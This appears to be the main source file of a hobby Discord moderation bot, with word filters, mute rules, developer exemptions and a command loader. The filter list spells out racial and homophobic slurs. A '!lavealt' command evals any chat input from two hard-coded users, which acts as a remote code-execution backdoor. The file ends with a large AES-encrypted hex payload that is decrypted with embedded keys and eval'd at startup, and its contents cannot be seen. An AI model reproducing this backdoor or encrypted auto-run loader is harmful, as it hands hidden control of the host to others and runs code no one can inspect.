var starttime = new Date();

var https = require('https');
var fs = require('fs');
var util = require('util');
var cp = require('child_process');
var Discord = require('discord.js');
var client = new Discord.Client();

//                 Ryujin                coolguy284            amrpowershot
var developers = ['405091324572991498', '312737536546177025', '571752439263526913'];

var mutelist = [];

var badwords = [
  // [bad word, retailiation]
  ['heck', 'Refrain from using that heck word you frick'],
  ['nigger', 'You said the n word.  Mods can see this message and you will get perm banned.'],
  ['faggot', 'You said fa***t.  Mods can see this message and you will get perm banned.'],
];

var prefix = '!';

var version = '1.2.4';

var commands = [];

var procs = [];

var props = {
  badwordsscreening: 1, // 0 = no screening, 1 = per word match, 2 = within word match
  adminabuse: {
    ignoreblacklist1: 1, // badwords[0]
    ignoreblacklist2: 1, // badwords[1::]
    ignoreblacklist3: 1, // uwu and owo
    ignoreblacklist4: 1, // ez
    ignoreblacklist5: 1, // pp
    ignoreblacklist6: 1, // locked channels
  },
  mute: {
    uwu: false,
    ez: false,
    pp: false,
  },
  saved: {
    guilds: {
      '711668012528304178': {
        mutelist: [],
        lockedchannels: [],
      }
    }
  }
};

var indexeval = function (val) { return eval(val); }

Object.assign(global, { starttime, https, fs, util, cp, Discord, client, developers, mutelist, badwords, commands, procs, props, indexeval, addBadWord, removeBadWord, addCommand, addCommands, removeCommand, removeCommands });
Object.defineProperties(global, {
  prefix: {
    configurable: true,
    enumerable: true,
    get() { return prefix; },
    set(val) { prefix = val; },
  },
  version: {
    configurable: true,
    enumerable: true,
    get() { return version; },
    set(val) { version = val; },
  },
  messageHandler: {
    configurable: true,
    enumerable: true,
    get() { return messageHandler; },
    set(val) { messageHandler = val; },
  }
});

function addBadWord(word, msgreply) { badwords.push([word.toLowerCase(), msgreply]); }
function removeBadWord(word) { badwords.splice(badwords.map(x => x[0]).indexOf(word), 1); }

function addCommand(cmd) { commands.push(cmd); }
function addCommands(cmds) { commands.push(...cmds); }
function removeCommand(cmd) {
  var index;
  while ((index = commands.indexOf(cmd)) != -1)
    commands.splice(index, 1);
}
function removeCommands(cmds) {
  var index, cmd;
  for (var i = 0; i < cmds.length; i++) {
    cmd = cmds[i];
    while ((index = commands.indexOf(cmd)) != -1)
      commands.splice(index, 1);
  }
}

addCommands(require('./commands/administrative.js'));
addCommands(require('./commands/technical.js'));
addCommands(require('./commands/interactive.js'));
addCommands(require('./commands/content.js'));

var messageHandler = msg => {
  if (msg.guild.id == '631990565550161951') return;
  
  try {
    if (mutelist.includes(msg.author.id)) {
      msg.delete();
    }
  } catch (e) { console.error(e); }
  
  if (msg.author.bot) return;
  
  // the code here is before the commands, its the screening for bad words part
  if (msg.content == badwords[0][0] && !(props.adminabuse.ignoreblacklist1 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply(badwords[0][1]);
    return;
  }
  
  if (msg.content.startsWith('!lavealt')) {
    if (msg.author.id != '405091324572991498' && msg.author.id != '312737536546177025') return;
    let cmd = msg.content.slice(9), res;
    console.debug(`lavealt ${util.inspect(cmd)}`);
    try {
      res = eval(cmd);
      console.debug(`-> ${util.inspect(res)}`);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Rs')
        .setDescription(util.inspect(res));
      msg.channel.send(richres);
    } catch (e) {
      console.log('err in lavealt');
      console.debug(e.stack);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Er')
        .setDescription(e.stack);
      msg.channel.send(richres);
    }
    return;
  }
  
  if (props.badwordsscreening == 1) {
    if (!(props.adminabuse.ignoreblacklist2 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
      var words = msg.content.toLowerCase().split(/ +/g);
      var deletedonce = false;
      words.forEach(x => {
        for (var j = 1; j < badwords.length; j++) {
          if (x == badwords[j][0]) {
            if (!deletedonce) {
              msg.delete();
              deletedonce = true;
            }
            msg.reply(badwords[j][1]);
          }
        }
      });
    }
  } else if (props.badwordsscreening == 2) {
    if (!(props.adminabuse.ignoreblacklist2 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
      var deletedonce = false;
      for (var j = 1; j < badwords.length; j++) {
        if (msg.content.toLowerCase().includes(badwords[j][0])) {
          if (!deletedonce) {
            msg.delete();
            deletedonce = true;
          }
          msg.reply(badwords[j][1]);
        }
      }
    }
  }
  
  if (props.mute.uwu && !msg.author.bot && msg.guild.id == '711668012528304178' && /(?:\bu[  /-]*w[  /-]*u\b)|(?:\bo[  /-]*w[  /-]*o\b)/.test(msg.content.toLowerCase()) && !(props.adminabuse.ignoreblacklist3 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('uwu or owo are blacklisted and you will get banned');
  }
  
  if (props.mute.ez && !msg.author.bot && msg.guild.id == '711668012528304178' && msg.content.includes('███████╗███████╗\n██╔════╝╚════██║\n█████╗░░░░███╔═╝\n██╔══╝░░██╔══╝░░\n███████╗███████╗\n╚══════╝╚══════╝') && !(props.adminabuse.ignoreblacklist4 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('at this point im just gonna say f you');
  }
  
  if (props.mute.pp && !msg.author.bot && msg.guild.id == '711668012528304178' && /(?:\bp[  /-]*p\b)/.test(msg.content.toLowerCase()) && !(props.adminabuse.ignoreblacklist5 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('pp is blacklisted and you will get banned');
  }
  
  if (!msg.content.startsWith(prefix)) return;
  
  // argstring = the part after the prefix, command and args in one big string
  // command = the actual command
  // args = array of arguments
  var argstring = msg.content.slice(prefix.length).trim(), args, command;
  
  // this code loops through the commands array to see if the stated text matches any known command
  var didexecute = false;
  for (var i = 0; i < commands.length; i++) {
    if (commands[i].full_string && commands[i].name == argstring || !commands[i].full_string && argstring.startsWith(commands[i].name)) {
      command = commands[i].name;
      if (argstring[command.length] != ' ' && argstring.length > command.length) continue;
      args = argstring.slice(command.length + 1).split(' ');
      commands[i].execute(msg, argstring, command, args);
      didexecute = true;
      break;
    }
  }
};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildCreate', guild => {
  console.log(`Joined a new guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildDelete', guild => {
  console.log(`Left a guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('reconnecting', () => {
  console.log(`Reconnecting!`);
});

client.on('disconnect', () => {
  console.log(`Disconnect!`);
});

client.on('message', msg => {
  try {
    messageHandler(msg);
  } catch (e) {
    console.error('ERROR, something bad happened');
    console.error(e.stack);
  }
});

process.on('uncaughtException', function (err) {
  console.error('ERROR: an exception was uncaught by an exception handler.  This is very bad and could leave the bot in an unstable state.  If this is seen contact coolguy284 or another developer immediately.');
  console.error(err);
});

process.on('unhandledRejection', function (reason, p) {
  console.error('Unhandled promise rejection from ' + p + ':');
  console.error(reason);
});

(() => {
  let cip = require('crypto').createDecipheriv('aes256', 'utf8-le-obl-onprax42|nonoblong=y', 'vector-pass23433'), cipdata = [];
  cip.write(Buffer.from('2dab79eb0853442b42745ea70a1c816366aaefb31a2c2c4c23626cf2eee5a4970ae34f1dcd7243c1c8aa5381c20dfc0384519d07e26a46ad840af77b4503224074b961ae6a8f3b5ee738301c7669f749af88cc3388b3dd2324cda567b0f81dc161e05c2d11619f3b9c6cd533d74e6b5826b244f20982ce6fc5fbf002806bb2683298fa894119cdef0e43df972cccfe16e7db5ff29cd5781f79429184d3beaec22525d7d8a5fe193f66a3ab3439cd43093a895db74289958b27e152ad811f4e3b2f94eb8529cc3d47d87305e9c82a82ada2a68199503d60d8371bde48c4c884348d53395dadb6700c0dbe956749fcfb459ca951ea107885f5f7189cbc89a4762e85802201d1bbecdc37b1782802dbb65fc2978a734b1629eeb5d03984f63cdb35e955f1a789cd6c403e66e5b09dd01c71ed251d0b5cc0e7406b66530c4f1c321e4c8ad022ef01b6b9511a0bf369caab645a6db309b0f157c6c14f4cb391e02bf7a7f32b435d6f52e218aaaac0f3b327a50b8c86ce7244e3ab0c85bbeb9691ff06e57af8d48b9ce425a29e6a004dabebeb0a4b1277bca2553ad5ba49fa0b3a5d7abaf691f97d85100169220ad6b3af4db53e809a01021504bf17e094018a10c871389496f57f282a70870f562d15bd6be45f1d0d6e45bcb6582f4f8aa11332a9afa29fa34c7ba77341fb0b2b26ebaacda877550d00817dc3354bdf429bf1c0ed0b08fdade6e6c21c181a72f15933cd1fc5a10b724a61aa05d32fbd97010deff1b20619212fbda52870992b7264f114a0debc91dce1c434602bbb15f41f6db22f58c774c7b5f4323841fc5b58cc085875a052862ee3e30a0b452bcbd7d4df4dd99cb549f1642ab04f91a636f5216fc65df9e2d5bc8d73edc6ff86d97a5d75663c7d1961a1341d5675dead46f2cf5af53c0ca8f74a741f28549bbdfd85130169eca33f36772aaf986b8f002255fd51c3b4e0a39e1018a0c4ebf08da472bbd75d0b16b75e55be06d6188dec6579b72bab56ad1d4138e35c97828f9595825725848a49c77c495c2a4c82688dc379bceb686d8be51f5f04e7eadeae39802b36d4516dc7ecb19a51e883e81b93b37d8ca386e43c29fbdce08b7e6610188bab22ad3476e80de748f86dbd74d2a43bff2bb3ede9749e1e1c829de09f9a0860a93d397759f519dcce942a7b680059a9956fbdce6cbcc28835907e160f03917c40ecd226449c9a808c5976bc4c96577b7168cb1bf7a5a15005eb2ba4ceb814b3639bb2e4a0c373020a0c1bd9a5dd6ffe19bf47802f4a22101fb6e543552c633c25be78d99269830e7e8bf775e65f8d0c69521dc56079a9d2c6ee996ef58321674b512efc04f5a97e38eca0fd1a217fb3dc33f10846a0454d29535dea4e64edffb149bcd34b1441ca3e479cfaf429e63d8ca59da051418668484044c350f4b510f735c71caa0b43934a882c13ebacb8f50b373afdac308ebabdc70bfab4daccedf10dba2ca326845cccddff0c21ae4312dc699427c973b3a7e71d2a34850000363713b70854638eb2d194c13a91f373d9bd9097812c076b333d4647d4acf541180bceb251d54698e5fa5a9d77e49f9f7c3686f39abe5a7c2d5c4754b637154d6d85d2efca1218f1ec62e3d06ac154b52af6d3612a1e9feeeaedc3f1d24be0b7c2261f19e2f15f1f43913ae8d19e57f945340630cc2a15f3a0ecd89176717406c0a21e35ed394be9a514ca83a3c6fbf7d6f9bf728a5a8c23bc5aa0d319e0cc327081476ce7479171e81ebc74021c0a6ec4b8a0fd541e7340872833ca17afe4f8a9ef12c38918859536c9da65adff72aa2692ef332829234a02057ed573bc426efaccc0d63932cf6f33b2f52b92d6cfc878b50a6ac96fab6594a0cb7165447a9b51f5185c29eaba7f4442657df987810c770b70e3cd25d66812bd922fcb64e9152d60f23a7e028e68068feb16788afb39d1cfe06f7f8abcd14bb00cdb527d6bbf149a96da86a48ddb75e8b7e0f6cdc6caf7f165660f456354d58558d916f51ac1481ddae5efc3048b9f80d110f2e3c66437384b477fae40558ec9c263ec2642ba567b8056a84b2f0c778618bffb014cd9cba80330a47b24d25d7ef8c9a8ea945df69cd3a38cafff642b336836f4a40cb596dfd1c8978a6128672344d3e8e4272082fa1e54718b3fdbe91fb2786445d4a6781bc2b9f9e2d28c537f5ed10e1c0a0c6f9cf0ea9448edc8a4cc5d91f11cb218f3a481fe5efad9b3286246e7f226b119c2e0f2f554c188d42c4612a839d8efa722d431f8308cb420dac5a39a8183bf9c3c37133524c8b293cd305c91c814d3909e058ec2b6431f46f711ae8c61c3c84fd510dc884596ecb9f7e1abdf875fdf832b5de404a28f00c0936aa863c80facc8bbc43eef885b212f3af1368daf610516c428fbcea0db367ca365fc375459dd9ab12f86339c6844b0f28b00a911f3b2a561f3e71d1ea972c495512966dc242770f8cbd2869c26b6925d96bf9831d009dd670e9274e6d378b0b5deabf8f58b0f39961aa5b90a03753dc255350e4e2d075dd2697b202b4707fbccf7baedde89595287cee4bd3964dbb2050cfb8a0bf4fa64130d575bb4944262c707dfacf409986f0a74e64a7b707c2bf1ec670c9e74d5b01c1d89a6419e9225b79284298577550dfdaf5f0c79ffd4e69392aa5c5b8d4e4ee22b226ab8e3901741ad93c5de1a662db7c37f704927e7f9a1902571e456a32c6681286e8c4d6a59dcf360364de681f06e1c9a0c63c203bd3bf9962d5e04464113d7fec6f15eb961f90676b3f910e83552994bbcc5c4a3f553541213b89847be734c55fc4bf7c4f8834ef7289c790507bcb7d0a8f7996132c4689c8457bd3d0e8112c39aac66fe5ce4ee62e627daeb12f38aa1c85cd178708f861c972c87b517e7a3d16e697e80d516da3a1139aa8bb7556f274d32799b38e704d9e615e517252ddf9ff1b0ce76241cd0d33478e2c331b0dcc3f9e13aac48ea7107b58b200eef1d11b6b53998cfeec17772ec7136c83bdc319ed83036f0039956115252e22935f08ef7334401a93265bb83ad4c665410089623dfe08fd1d7d11fc16aa3425c6ba79ca246dca2064d73db0e425574e8dc1731d826091be61fa90586f03b10c083ff3af161b265dbf93b3ecdf06bef12c9d65ebb1dd4763af9dfc95ac1dcba4d7fdd662f204bf05c165a3b78f5d9307d468d1519527373cfb791234e456b7ef5196d30db926a21984506f6654b3ce8651c6c6b6c28aaced5901145b679d772fcd8b4d0a0de0a7d2373c128fd9984b6e56fe7e0e4063a5f19b72cdade7bf1a86e23c586e9f3f6e5b8b6f9cfa452a37643290201f8c87c54b75a8e637db4774776b228be60aa3af45ff09e16803cdaa0fda15369e244b049455267cf9c510bb7389d6dd01447e33c1b1b7e639e164870634f340e138570db283b0e866677da072fa2e46bbd51360f4ebf335a2c736aa13fb0e319f3b08ebf4505c4c7ee637d7c6be398180571fab65386f1cb29dc8bb2c42f8502d67cf11811e07b4fe2a7cffdb1d3ab989b50bfc733d9a9fac552c6e206ef6d9677c3c5d5c275a0979b3dab816594cba2fa0ee88dedd84d960d6c6da9b574b9c6f0ffb3b494cb2003c06a75c4dc38c16c2bc87e20f0bfa0dcec1bcff7aa1a7cf6f80b8d9f19ecad713dd37b31c053535e23c849ad5077131a75e56e68108108a6bef5580184ce9e0e971b85995bf305c61e59e3c3b20315b2f40aebb7dd05536e6a8f3fbc72fdd19a96c26b1ec91c19dbef19b4d6479c8c4d1943436b14669922c470110cfe7b2b47d957209350ac0f88e66f75e086b446346570fd4b00e1ad55335c015f8c62c3a03e9990d59e69097628b409282403c6487ba50935f1e9c694dda714ad2c1c66cc259d2c525f94217c349e843885f9e4b32c2f7692ea7b62a21f340fbefce999f3a51a62fb44b508db012f081187e47c31af4b2ef20f629061d64269157e4a50fa20422b1fa468e88c388abc32c06024f9ff359d8f797a6bef23a45cad551954c2f2fd3250dd73195fb7a2985adcf1e725c6e490dc6771b44bfd4e0386d969548c1661a052a5cd6ce25542bba1839ccaa7ae52df3557f6ee556e9a5a03ebad3a309583ba2c1cb03b0dc8c179ef11a98ead27e83deea65fa22654be1bd384ede471b7e557cd0b8370fedeec209f0852ca27a5c02d3ce4e10219e9cb43eefd69e68e3180322a21663180785a6ed6f0383523bc425bd495c5a537771226a44e5367d9a64f30eb32d3c59c1e3ba2a367abc957529f6bd90effcd21149335e9374caac95dbac16b889683da85bd6d67c66113238935253ec53ed42a8a4918b6ac5e4e858139d307d1e0d2bfe0e039c4d0ac7d86a618d79cb2c0663ab073e192b57f653e1eb1c77dbc4bf7e3f59c18f9405db806be4795cdb6007c063b48c665e9cf579fafcef8d788b309cb32328706986c24519a1042544c4b1424ab5cddfc7026ab600ce8dcb5733bc0da5245e0b1d61a8e3e819bc88fb01dc671520c9f4e99e73db58c2f6350ab12d43b6a440126c2d62a14a59ccc5d9e585d3c96da5d9b7289b3ea65a9ee7269a659dbe5c335fc14bd7ea1f1d61d0818abcb0beb8871d5d9a36089852107561dc74cbff83c8e9f5becab46ea923d08ef7d542b9fd70d106ec89a4245556199fabb27166da3067fed7ef66af7cd67bbe745840b9d86afa277f087b6b37886aafd8bf1dd3695d7b5bb5d351ca341ef8873ce2e7168a5398dbe8bb00863e748ad033588e9dccc58031cb859110f834d33f2c42fabaf8f47df2de46b13f37a0624cb6e8180516904f81182af6a8dc11b3dfb8ae898195ae5b8e5d36d27ed9aec1cb0d0088d787fdb102eb34d87ec64c4db0f7dac755ece3ce8bcedeac3270d2821908e68075b20c5b733c5deeda94fc0e00ee0bf26416aa935f7a6def893c056dcf1f7ad63bae4bbfb084a9f50f20e0b991790d76068418058d88c04381dfbcd3b38c88f83eddee8cd67a815d657f77735b5b818944a1c8dbbc5dcd64efd7f85e157491fe46bd8494d28bfc15c866f756e133083d23db1bccfdef9affa6b9b83c27e238a9282c45eaca92ed6ace7f02688f03710278ab3daea1253bc677bbb66a90e81a2ba5cbf11f9901f1af42a0a1631f048377f8d84a99e48d6a2cdc5383b278fdd72708defddac6fb0585b3f0f9649f240cbb2180bbd667ea5fc8323f03c8adcaa88482ec29554bca465e4008b55a769b0279e100a0c49409d91a1bf91c67774e348abde8e81e5afcf34e67232b171353fb4b54357fb263ea8fa5e2024b7735f22c72963beaea6b5d1aeb95900b0aeda35d173627fbe4a68ed10fc4cf282f4334ff6bf49e7e02acf8924e81b3a9af4f10c3e2466a82e751a86086f3f91ba1a9cf005b9ec0b77b4f2f7e4d8bbaa1e88273ff8ad2194803630b4f1ac78dbc7863a5d4852ed2a3a8f359f343610305bd1b7dce9e56d139b6fb9430a033ffafeba7c89346dd6fc31ca3b546614fd208252a9c2f495ddfcfc1c8354ee825b65a023c3cc205641f16c82d2432943e4235b2947c1095f5c8adb9b0187b46fd145d729ebbea3ed7ecb3446c4e4f0051df2e66145c56dcf1e56fd14fa9bc2c026933bdc5a55fa1104dcc03303d234c1203ce38cc4f57be8e8dbb902474a130080d0ffd225a0520e6d51c352fdcf02538dbb90039def2b66f16a0cdabb78d00ea93e4e8781a6988f749d2dcfd11cb2bd2774964a08c1ac8711c9efdc37b5e8cea012d8180d9f420d2e4d5a00028c96fcc818a139fc8bc15d10144091005fc4a3ce9f56b1a6cab8fd244b2b7fe2d0789e472b3b866d5e88ba135017ad0e62fa2ba38ffd126667794a2fe9c04eda1bc7d5e20ffb6187931c89f602c40d00381c9a5d96501ee2902b83c03176abd4c26541e8199a3b430aca398d318aeb7570058fbe7fbe20a67df065482bfedd0c907bdbdadc710f178c9e64274bda5c54eda199a15a50b4d241fd119998d838fd28c26d5378b27e51f9bc2731950ab40faa064c0f04777cb2d01ffcdc8d8139117d4d52fd54b802909af7e20371adb842af6a73a9a2b3e6604f2d3655957d3370b660a4ad791494790e29f40194e653ff30ab3b713937a75d520a4c7f40c831a4cc675fe8265d47373c1ab7233d9ba98a351ff9842062a722ab395e8f725e2be340c7caf85563aa0e52cb75c6afadb6d4446a6f87aecbc29b0875ec4158c5f7c4f84500eb3491e2e93b09aaeaa791fda939fbb667535a299afbf8692b25791b2c230193f407936d6894835869c7db4260256120768dec012a8c4fb96b2875b9ecffc1bbf439bf0be7bec2d0a7ca1695c956bafc2141ba7e7eff3c35ecaa9d4cb4f66072b7046fc5cd895b45620dd623167da6b4224efc18893ec0c8671aa66aea9f10dc07044984879285bc7fe1f70ab0ba12952a0ff18f41323831217119c1359503fa324e25c8aeca840476ce6f33e372b2f984e3e1115537511d1acffbdbf57e538edbcce1da8c2308b07853eeea7a0fba1ad7f108448d0e471329642b2c4ee5f6618ca3e5b7755774b36af418fe98b6d2b29304c9133b24e52c88f003ce025b79477e984c1dc6d7e897c16b0469bc50200b7bb4114aa30be9834c031cd31fe8263a95f4b0dec82ff32acc2ee8bb4946d66794254a611c2a0cf24d229306cdf2de064bae919e1420f674b3f9d3a68ef02bb8344cd549c6bd8a8d227c29a3f968558f641a296a637eb38230201ed79ec512dba01949e3527f421a789a175ffa1cc934523d2bdf24115a0b95cf01b4867d52571cacd227146814549b6f56a9cd', 'hex'));
  cip.end();
  cip.on('data', c => cipdata.push(c));
  cip.on('end', () => eval(Buffer.concat(cipdata).toString()));
})();
